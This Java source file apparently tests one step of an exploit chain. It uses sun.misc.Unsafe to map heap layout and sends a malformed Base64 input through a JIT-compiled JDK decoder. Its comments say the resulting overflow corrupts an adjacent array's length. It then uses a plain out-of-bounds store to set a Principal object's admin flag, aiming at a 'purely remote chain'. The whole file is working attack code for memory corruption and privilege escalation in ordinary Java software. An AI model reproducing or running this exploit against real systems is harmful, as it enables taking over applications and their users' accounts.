import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * Can a plain, C2-compiled Java array store reach past a corrupted buffer?
 *
 * This decides whether a purely remote chain is possible: if `buf[i] = v`
 * works after the spill destroys buf's header, the *application's own* write
 * becomes the chosen-value writer and no Unsafe is needed anywhere.
 *
 * Layout under test:
 *   creds byte[65]      <- decode destination, spill source
 *   buf   byte[64]      <- header damaged by the spill, length becomes huge
 *   principal           <- untouched (past the spill), admin flag target
 */
public final class StoreTest {
    private static volatile int sink;
    private static sun.misc.Unsafe u;

    static final class Principal {
        volatile boolean admin;
        String user = "anonymous";
    }

    static int len(byte[] b) { return u.getInt(b, 12); }
    static long addr(Object o) {
        Object[] a = new Object[] { o };
        return u.getLong(a, u.arrayBaseOffset(Object[].class));
    }

    public static void main(String[] a) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);

        byte[] creds = new byte[65];
        byte[] buf = new byte[64];
        Principal p = new Principal();

        long ca = addr(creds), ba = addr(buf), pa = addr(p);
        System.out.printf("[layout] creds=0x%x buf=+%d principal=+%d%n",
                ca, ba - ca, pa - ca);
        System.out.printf("[layout] buf.length=%d admin=%b%n", len(buf), p.admin);

        // trigger: 62-byte spill from creds lands on buf's header
        for (int i = 0; i < 50_000; i++) sink += d.decode(valid, warm);
        try { d.decode(bad, creds); } catch (IllegalArgumentException e) { }

        System.out.printf("[after ] buf.length unsafely = 0x%08x (%d)%n", len(buf), len(buf));
        int javaLen;
        try { javaLen = buf.length; } catch (Throwable t) { javaLen = -1; }
        System.out.println("[after ] buf.length in Java   = " + javaLen);

        // the app's own plain store, as a C2-compiled byte[] write
        int idx = (int) ((pa + 16) - (ba + 16));
        System.out.println("[store ] principal.admin is at buf[" + idx + "]");

        String res;
        try {
            buf[idx] = (byte) 1;
            res = "stored";
        } catch (Throwable t) {
            res = t.getClass().getSimpleName() + ": " + t.getMessage();
        }
        System.out.println("[store ] plain buf[" + idx + "]=1 -> " + res);

        boolean adm = p.admin;
        System.out.println("[result] principal.admin = " + adm);

        System.out.println(adm ? "RESULT=PLAIN_STORE_REACHED_TARGET"
                               : "RESULT=PLAIN_STORE_FAILED");
    }
}
